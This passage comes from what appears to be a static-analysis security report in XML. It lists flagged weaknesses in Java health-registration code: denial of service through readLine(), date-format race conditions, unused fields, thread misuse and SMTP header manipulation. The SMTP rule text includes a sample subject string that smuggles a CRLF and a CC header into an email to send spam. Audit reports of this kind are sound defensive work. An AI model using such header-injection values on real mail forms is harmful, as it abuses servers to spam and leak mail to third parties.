                        <Issue iid="FB206C4CBF05D7F9BFE0978E4748FE80" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The call to readLine() at FileUtil.java line 516 might allow an attacker to crash the program or otherwise make it unavailable to legitimate users.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>516</LineStart>
<Snippet>            String readValue;
            StringBuffer l_strBuffer = new StringBuffer(ONE_MEGABYTE);
            while ((readValue = l_inputStream.readLine()) != null) {
                l_strBuffer.append(readValue);
</Snippet>
<TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6203AD2212C756BAE0D3142A94B7C076" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The call to readLine() at FileUtil.java line 991 might allow an attacker to crash the program or otherwise make it unavailable to legitimate users.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>991</LineStart>
<Snippet>            while (p_iNumLines-- &gt; 0)
            {
                l_saFileContents[l_iPos++] = l_brInputFile.readLine();
            }
        }</Snippet>
<TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7E6ACC806296135E5420B2D5D47399AE" ruleID="24023E22-D6C7-4D5C-B049-38B7EFC8B408">
                            <Category>Denial of Service</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The call to readLine() at FileUtil.java line 946 might allow an attacker to crash the program or otherwise make it unavailable to legitimate users.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>946</LineStart>
<Snippet>            while (p_iNumLines-- &gt; 0)
            {
                l_sbFileContents.append(l_brInputFile.readLine());
            }
        }</Snippet>
<TargetFunction>readLine()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Dead Code: Unused Field</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The field m_objAppAreaDetCacheMgr is never used.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>This field is never accessed, except perhaps by dead code. Dead code is defined as code that is never directly or indirectly executed by a public method. It is likely that the field is simply vestigial, but it is also possible that the unused field points out a bug.

Example 1: The field named glue is not used in the following class. The author of the class has accidentally put quotes around the field name, transforming it into a string constant.


public class Dead {

  String glue;

  public String getGlue() {
    return "glue";
  }

}


Example 2: The field named glue is used in the following class, but only from a method that is never called.


public class Dead {

  String glue;

  private String getGlue() {
    return glue;
  }

}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>In general, you should repair or remove dead code. To repair dead code, execute the dead code directly or indirectly through a public method. Dead code causes additional complexity and maintenance burden without contributing to the functionality of the program.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>8</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="A83DAB089E6FDC74F37789F2B055E55C" ruleID="3E7BCE41-4A79-49FF-8B8B-3F55F1F2DC5E">
                            <Category>Dead Code: Unused Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The field m_objAppAreaDetCacheMgr is never used.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AppAreaDetCacheMgr.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/AppAreaDetCacheMgr.java</FilePath>
<LineStart>52</LineStart>
<Snippet>
     /** Singleton instance. */
      private AppAreaDetCacheMgr  m_objAppAreaDetCacheMgr;

      </Snippet>
<TargetFunction>Field: m_objAppAreaDetCacheMgr()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4C27F3738F3A053915E9596B26DDF9A9" ruleID="3E7BCE41-4A79-49FF-8B8B-3F55F1F2DC5E">
                            <Category>Dead Code: Unused Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The field m_sAppServerIP is never used.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EJBResourceFactory.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/ejb/EJBResourceFactory.java</FilePath>
<LineStart>79</LineStart>
<Snippet>     *  Application server IP for the initial context.
     */
    private String m_sAppServerIP;

</Snippet>
<TargetFunction>Field: m_sAppServerIP()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4F649FDAB15999E5AEE72C75CDC2931E" ruleID="3E7BCE41-4A79-49FF-8B8B-3F55F1F2DC5E">
                            <Category>Dead Code: Unused Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The field m_sAppServerPort is never used.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EJBResourceFactory.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/ejb/EJBResourceFactory.java</FilePath>
<LineStart>74</LineStart>
<Snippet>     *  Application server port for the initial context.
     */
    private String m_sAppServerPort;

    /**</Snippet>
<TargetFunction>Field: m_sAppServerPort()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AACD73ED7F908553368D8AB714606069" ruleID="3E7BCE41-4A79-49FF-8B8B-3F55F1F2DC5E">
                            <Category>Dead Code: Unused Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The field m_ObjEntityManager is never used.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ProviderDataEntryDAOImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/service/ProviderDataEntryDAOImpl.java</FilePath>
<LineStart>23</LineStart>
<Snippet>public class ProviderDataEntryDAOImpl implements ProviderDataEntryDAO {
	@PersistenceContext
    private EntityManager m_ObjEntityManager;

	public Map&lt;Long, CNSIMap&gt; getDataEntryRadios() {</Snippet>
<TargetFunction>Field: m_ObjEntityManager()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="15E10ED654DFEFFDC3D87809CE79EE7C" ruleID="3E7BCE41-4A79-49FF-8B8B-3F55F1F2DC5E">
                            <Category>Dead Code: Unused Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The field versionId is never used.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>NLRProviderRegStatementFormBean.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/web/form/NLRProviderRegStatementFormBean.java</FilePath>
<LineStart>28</LineStart>
<Snippet>		private String opstmnt0;
		private String opstmnt1;
		private Long versionId;
		private String dataSourceLkpcd;
		</Snippet>
<TargetFunction>Field: versionId()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="8">
                        <groupTitle>Race Condition: Format Flaw</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The methods parse() and format() in java.text.Format contain a design flaw that can cause one user to see another user's data.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>The methods parse() and format() in java.text.Format contains a race condition that can cause one user to see another user's data.

Example 1: The following code shows how this design flaw can manifest itself.


public class Common {

    private static SimpleDateFormat dateFormat;
    ...

    public String format(Date date) {
        return dateFormat.format(date);
    }
    ...

    final OtherClass dateFormatAccess=new OtherClass();
    ...

    public void function_running_in_thread1(){
        System.out.println("Time in thread 1 should be 12/31/69 4:00 PM, found: "+ dateFormatAccess.format(new Date(0)));
    }

    public void function_running_in_thread2(){
        System.out.println("Time in thread 2 should be around 12/29/09 6:26 AM, found: "+ dateFormatAccess.format(new Date(System.currentTimeMillis())));
    }
}


While this code will behave correctly in a single-user environment, if two threads run it at the same time they could produce the following output:

Time in thread 1 should be 12/31/69 4:00 PM, found: 12/31/69 4:00 PM
Time in thread 2 should be around 12/29/09 6:26 AM, found: 12/31/69 4:00 PM

In this case, the date from the first thread is shown in the output from the second thread due a race condition in the implementation of format().</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Use synchronization to protect against race conditions whenever parse() and format() in class java.text.Format.

Example 2: The following code shows two ways that the code from Example 1 can be corrected using synchronization constructs.


public class Common {

    private static SimpleDateFormat dateFormat;
    ...

    public synchronized String format1(Date date) {
        return dateFormat.format(date);
    }

    public String format2(Date date) {
        synchronized(dateFormat)
        {
            return dateFormat.format(date);
        }
    }
}


Alternatively, use org.apache.commons.lang.time.FastDateFormat class, which is a thread-safe version of java.text.SimpleDateFormat.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>8</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="5512B58F0967298C527A9035DEFBED23" ruleID="D92FBF3E-3721-4572-8278-5761E68444DF">
                            <Category>Race Condition: Format Flaw</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The methods parse() and format() in java.text.Format contain a design flaw that can cause one user to see another user's data.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DateConverter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/DateConverter.java</FilePath>
<LineStart>260</LineStart>
<Snippet>        //Make a string : convert the date to system pattern
        m_objSimpleDateFormat.applyPattern(p_sNewPattern);
        m_sDateString = m_objSimpleDateFormat.format(m_dtUtilDate);
        m_dtSqlDate = new java.sql.Date(m_dtUtilDate.getTime());
        m_objCalendar = m_objSimpleDateFormat.getCalendar();</Snippet>
<TargetFunction>FunctionCall: format()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="06240A3B45828EE967EDDC19AAAA5645" ruleID="D92FBF3E-3721-4572-8278-5761E68444DF">
                            <Category>Race Condition: Format Flaw</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The methods parse() and format() in java.text.Format contain a design flaw that can cause one user to see another user's data.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DateConverter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/DateConverter.java</FilePath>
<LineStart>522</LineStart>
<Snippet>        java.util.Date l_dtDate = l_objDateConverter.getDate();
        l_objDateConverter.m_objSimpleDateFormat.applyPattern(p_sOutputPattern);
        return l_objDateConverter.m_objSimpleDateFormat.format(l_dtDate);
    }
</Snippet>
<TargetFunction>FunctionCall: format()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="509DC7D51CD47DCF078040F574DBB673" ruleID="D92FBF3E-3721-4572-8278-5761E68444DF">
                            <Category>Race Condition: Format Flaw</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The methods parse() and format() in java.text.Format contain a design flaw that can cause one user to see another user's data.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DateConverter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/DateConverter.java</FilePath>
<LineStart>211</LineStart>
<Snippet>        
        m_objSimpleDateFormat = new java.text.SimpleDateFormat(p_sPattern);
        m_dtUtilDate = m_objSimpleDateFormat.parse(p_sDate);
        //Make a string : convert the date to system pattern
        m_objSimpleDateFormat.applyPattern(DATE_PATTERN);</Snippet>
<TargetFunction>FunctionCall: parse()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="85CB32072D9727F0EBD3377D7BB3F748" ruleID="D92FBF3E-3721-4572-8278-5761E68444DF">
                            <Category>Race Condition: Format Flaw</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The methods parse() and format() in java.text.Format contain a design flaw that can cause one user to see another user's data.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DateConverter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/DateConverter.java</FilePath>
<LineStart>214</LineStart>
<Snippet>        //Make a string : convert the date to system pattern
        m_objSimpleDateFormat.applyPattern(DATE_PATTERN);
        m_sDateString = m_objSimpleDateFormat.format(m_dtUtilDate);
        m_dtSqlDate = new java.sql.Date(m_dtUtilDate.getTime());
        m_objCalendar = m_objSimpleDateFormat.getCalendar();</Snippet>
<TargetFunction>FunctionCall: format()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="65CDF1E4B40FDDD7F86642E1E957FA68" ruleID="D92FBF3E-3721-4572-8278-5761E68444DF">
                            <Category>Race Condition: Format Flaw</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The methods parse() and format() in java.text.Format contain a design flaw that can cause one user to see another user's data.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DateConverter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/DateConverter.java</FilePath>
<LineStart>257</LineStart>
<Snippet>        
        m_objSimpleDateFormat = new java.text.SimpleDateFormat(p_sPattern);
        m_dtUtilDate = m_objSimpleDateFormat.parse(p_sDate);
        //Make a string : convert the date to system pattern
        m_objSimpleDateFormat.applyPattern(p_sNewPattern);</Snippet>
<TargetFunction>FunctionCall: parse()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>Header Manipulation: SMTP</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method sendHTMLEmail() in SendEmail.java includes unvalidated data in an SMTP header on line 67. This enables attackers to add arbitrary headers such as CC or BCC that they can use to leak the mail contents to themselves or use the mail server as a spam bot.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>SMTP Header Manipulation vulnerabilities occur when:

1. Data enters an application through an untrusted source, most frequently an HTTP request in a web application.
  
2. The data is included in an SMTP header sent to a mail server without being validated.
  
As with many software security vulnerabilities, SMTP Header Manipulation is a means to an end, not an end in itself. At its root, the vulnerability is straightforward: an attacker passes malicious data to a vulnerable application, and the application includes the data in an SMTP header.

One of the most common SMTP Header Manipulation attacks is used for distributing spam emails. If an application contains a vulnerable "Contact us" form that allows setting the subject and the body of the email, an attacker will be able to set any arbitrary content and inject a CC header with a list of email addresses to spam anonymously since the email will be sent from the victim server.

Example: The following code segment reads the subject and body of a "Contact us" form:

  
  String subject = request.getParameter("subject");
  String body = request.getParameter("body");
  MimeMessage message = new MimeMessage(session);
  message.setFrom(new InternetAddress("webform@acme.com"));
  message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("support@acme.com"));
  message.setSubject("[Contact us query] " + subject);
  message.setText(body);
  Transport.send(message);
  

Assuming a string consisting of standard alphanumeric characters, such as "Page not working" is submitted in the request, the SMTP headers might take the following form:

  
  ...
  subject: [Contact us query] Page not working
  ...
  

However, because the value of the header is constructed from unvalidated user input the response will only maintain this form if the value submitted for subject does not contain any CR and LF characters. If an attacker submits a malicious string, such as "Congratulations!! You won the lottery!!!\r\ncc:victim1@mail.com,victim2@mail.com ...", then the SMTP headers would be of the following form:

  
  ...
  subject: [Contact us query] Congratulations!! You won the lottery
  cc: victim1@mail.com,victim2@mail.com
  ...
  

This will effectively allow an attacker to craft spam messages or to send anonymous emails amongst other attacks.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>The solution to SMTP Header Manipulation is to ensure that input validation occurs in the correct places and checks for the correct properties.

Since SMTP Header Manipulation vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it is used in the header context and make sure there are no illegal CRLF characters that can break the header structure.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>6</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="CA30A66481268AAB1F0C43330A327874" ruleID="E723C4F4-672F-4276-9DBE-556D5E84E9EB">
                            <Category>Header Manipulation: SMTP</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method sendHTMLEmail() in SendEmail.java includes unvalidated data in an SMTP header on line 67. This enables attackers to add arbitrary headers such as CC or BCC that they can use to leak the mail contents to themselves or use the mail server as a spam bot.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>67</LineStart>
<Snippet>		email.addTo(to);
		email.setFrom(from);
		email.setSubject(subject);
		email.setMsg(body);
		if (cc != null &amp;&amp; cc.length() &gt; 0)</Snippet>
<TargetFunction>org.apache.commons.mail.Email.setSubject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ProviderRegistrationDAOImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/service/ProviderRegistrationDAOImpl.java</FilePath>
<LineStart>177</LineStart>
<Snippet>		q.setParameter(1, registrationId);
		q.setParameter(2, pymntYear);
		return (List&lt;NLRProviderRegistration&gt;)q.getResultList();
	}
	</Snippet>
<TargetFunction>javax.persistence.Query.getResultList()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B9FCA4E9F0C6700A61DD55A532551CAF" ruleID="E723C4F4-672F-4276-9DBE-556D5E84E9EB">
                            <Category>Header Manipulation: SMTP</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method sendHTMLEmail() in SendEmail.java includes unvalidated data in an SMTP header on line 67. This enables attackers to add arbitrary headers such as CC or BCC that they can use to leak the mail contents to themselves or use the mail server as a spam bot.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>67</LineStart>
<Snippet>		email.addTo(to);
		email.setFrom(from);
		email.setSubject(subject);
		email.setMsg(body);
		if (cc != null &amp;&amp; cc.length() &gt; 0)</Snippet>
<TargetFunction>org.apache.commons.mail.Email.setSubject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ProviderRegistrationDAOImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/service/ProviderRegistrationDAOImpl.java</FilePath>
<LineStart>110</LineStart>
<Snippet>     */
	public NLRProviderRegistration findById(long id) {
		return em.find(NLRProviderRegistration.class, id);
	}
	</Snippet>
<TargetFunction>javax.persistence.EntityManager.find()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0CF7AEC92DD788464DA682B6ABEBD01C" ruleID="E723C4F4-672F-4276-9DBE-556D5E84E9EB">
                            <Category>Header Manipulation: SMTP</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method sendHTMLEmail() in SendEmail.java includes unvalidated data in an SMTP header on line 67. This enables attackers to add arbitrary headers such as CC or BCC that they can use to leak the mail contents to themselves or use the mail server as a spam bot.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>67</LineStart>
<Snippet>		email.addTo(to);
		email.setFrom(from);
		email.setSubject(subject);
		email.setMsg(body);
		if (cc != null &amp;&amp; cc.length() &gt; 0)</Snippet>
<TargetFunction>org.apache.commons.mail.Email.setSubject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ProviderRegistrationDAOImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/service/ProviderRegistrationDAOImpl.java</FilePath>
<LineStart>216</LineStart>
<Snippet>		Query q = em.createQuery(EHRSQLConstants.SQL_GET_PRVDR_REG_INFO.toString());
		q.setParameter(1, registrationSid);
		return (List&lt;NLRProviderRegistration&gt;)q.getResultList();
	}
	</Snippet>
<TargetFunction>javax.persistence.Query.getResultList()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5BD2FA636EFEB9413525C7B030149777" ruleID="E723C4F4-672F-4276-9DBE-556D5E84E9EB">
                            <Category>Header Manipulation: SMTP</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method sendHTMLEmail() in SendEmail.java includes unvalidated data in an SMTP header on line 67. This enables attackers to add arbitrary headers such as CC or BCC that they can use to leak the mail contents to themselves or use the mail server as a spam bot.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>67</LineStart>
<Snippet>		email.addTo(to);
		email.setFrom(from);
		email.setSubject(subject);
		email.setMsg(body);
		if (cc != null &amp;&amp; cc.length() &gt; 0)</Snippet>
<TargetFunction>org.apache.commons.mail.Email.setSubject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ProviderRegistrationDAOImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/service/ProviderRegistrationDAOImpl.java</FilePath>
<LineStart>164</LineStart>
<Snippet>		Query q = em.createQuery(l_sQuery.toString()).setMaxResults(1);
		q.setParameter(1, registrationId);
		return (List&lt;NLRProviderRegistration&gt;)q.getResultList();
	}
	</Snippet>
<TargetFunction>javax.persistence.Query.getResultList()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9015A492E14390FCA473ADB85208C2B2" ruleID="E723C4F4-672F-4276-9DBE-556D5E84E9EB">
                            <Category>Header Manipulation: SMTP</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method sendEmail() in SendEmail.java includes unvalidated data in an SMTP header on line 90. This enables attackers to add arbitrary headers such as CC or BCC that they can use to leak the mail contents to themselves or use the mail server as a spam bot.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>90</LineStart>
<Snippet>		email.addTo(to);
		email.setFrom(from);
		email.setSubject(subject);
		email.setMsg(body);
		if (cc != null &amp;&amp; cc.length() &gt; 0)</Snippet>
<TargetFunction>org.apache.commons.mail.Email.setSubject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ProviderRegistrationDAOImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/service/ProviderRegistrationDAOImpl.java</FilePath>
<LineStart>177</LineStart>
<Snippet>		q.setParameter(1, registrationId);
		q.setParameter(2, pymntYear);
		return (List&lt;NLRProviderRegistration&gt;)q.getResultList();
	}
	</Snippet>
<TargetFunction>javax.persistence.Query.getResultList()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="6">
                        <groupTitle>J2EE Bad Practices: Threads</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method CNSIRequestProcessMonitor() in CNSIRequestProcessMonitor.java calls Thread()  on line 49. Thread management in a web application is forbidden in some circumstances and is always highly error prone.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Thread management in a web application is forbidden by the J2EE standard in some circumstances and is always highly error prone. Managing threads is difficult and is likely to interfere in unpredictable ways with the behavior of the application container. Even without interfering with the container, thread management usually leads to bugs that are hard to detect and diagnose like deadlock, race conditions, and other synchronization errors.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Avoid managing threads directly from within the web application. Instead use standards such as message driven beans and the EJB timer service that are provided by the application container.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. If you are auditing a non-J2EE Java application, the J2EE Bad Practices categories may not apply to your environment. If this is the case, you can use AuditGuide to suppress these issues.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>6</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="D3ED850B729D04C53BE6F59751BC562B" ruleID="8ECE1D9E-AE40-4AD1-9ECB-6D024DBF8FCA">
                            <Category>J2EE Bad Practices: Threads</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method getCalculatedVolume() in CalculateRegistrationVolumeImpl.java calls sleep()  on line 85. Thread management in a web application is forbidden in some circumstances and is always highly error prone.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CalculateRegistrationVolumeImpl.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/business/impl/CalculateRegistrationVolumeImpl.java</FilePath>
<LineStart>85</LineStart>
<Snippet>	public void getCalculatedVolume(ProviderRegistrationResult l_objProviderRegistrationResult, EHRUserDetails p_objEHRUserDetails) throws CNSIException {
		try{
			Thread.sleep(10000);
			calculateVolumeThreshold(l_objProviderRegistrationResult, p_objEHRUserDetails);
		} catch(RuntimeException e) {</Snippet>
<TargetFunction>sleep()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E9D85DBB1C5207206495455B762EDE99" ruleID="8ECE1D9E-AE40-4AD1-9ECB-6D024DBF8FCA">
                            <Category>J2EE Bad Practices: Threads</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method process() in CNSIRequestProcessorImpl.java calls start()  on line 580. Thread management in a web application is forbidden in some circumstances and is always highly error prone.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIRequestProcessorImpl.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/ecams/common/CNSIRequestProcessorImpl.java</FilePath>
<LineStart>580</LineStart>
<Snippet>                        final List&lt;String&gt; syncObject = new ArrayList&lt;String&gt;();
                        syncObject.add("FALSE");
                        (new CNSIRequestProcessMonitor(syncObject, l_sPageName, b_mapNewPageDetails, b_mapOldPageDetails)).start();
                        b_mapOldPageDetails.putAll(b_mapNewPageDetails);
                        // sync on our sync object since it is used in multiple threads</Snippet>
<TargetFunction>start()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DD1AE694CFC88B6F1605D79ACE73E219" ruleID="8818735A-08BB-4274-AE6F-3DE087AAE3C0">
                            <Category>J2EE Bad Practices: Threads</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method CNSIRequestProcessMonitor() in CNSIRequestProcessMonitor.java calls Thread()  on line 49. Thread management in a web application is forbidden in some circumstances and is always highly error prone.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIRequestProcessMonitor.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/monitor/CNSIRequestProcessMonitor.java</FilePath>
<LineStart>49</LineStart>
<Snippet>     * @param p_mapNewPageDetails Parameter variable of type CNSIMap with page details
     */
    public CNSIRequestProcessMonitor(List&lt;String&gt; p_lstSyncObject, String p_sPageName, Map p_mapNewPageDetails, Map p_mapOldPageDetails) {
        m_lstSyncObject = p_lstSyncObject;
        m_sPageName = p_sPageName;</Snippet>
<TargetFunction>Thread()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7C2D8E1E00018953FDBA646896858B54" ruleID="8ECE1D9E-AE40-4AD1-9ECB-6D024DBF8FCA">
                            <Category>J2EE Bad Practices: Threads</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method getCalculatedVolume() in CalculateRegVolumeNewImpl.java calls sleep()  on line 46. Thread management in a web application is forbidden in some circumstances and is always highly error prone.</Abstract>
                            <Friority>Low</Friority>
